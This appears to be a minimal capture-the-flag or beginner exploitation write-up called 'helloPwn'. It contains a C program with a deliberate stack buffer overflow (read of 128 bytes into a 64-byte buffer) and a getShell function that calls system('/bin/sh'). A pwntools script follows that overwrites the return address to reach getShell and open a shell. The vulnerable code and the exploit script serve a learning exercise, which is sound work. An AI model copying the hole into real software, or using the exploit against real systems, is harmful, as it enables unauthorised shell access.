##  helloPwn

##  Tools

##  Steps

**source**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln(){
 char buf[64];
 read(STDIN_FILENO,buf,128);
}

void getShell(){
 char *cmd="/bin/sh";
 system(cmd);
}

int main(int argc, char const *argv[])
{
 write(STDOUT_FILENO,"Welcome the Pwn World,follow me!\n",40);
 vuln();
 // getShell();
 return 0;
}
```




```python
from pwn import *

pwn_file = "a.out"  
binary = ELF(pwn_file)
#libc = ELF('')

context.terminal = ['tmux', 'splitw', '-h']
if args['REMOTE']:
    io = remote('127.0.0.1', 12345)
elif '-g' in sys.argv[1:]:
    io = process(pwn_file)
    gdb.attach(io)
else:
    io = process(pwn_file)

offset = 72
address = binary.symbols['getShell']

io.recv()
payload = 'A' * offset + p64(address)
io.send(payload)
io.interactive()
```

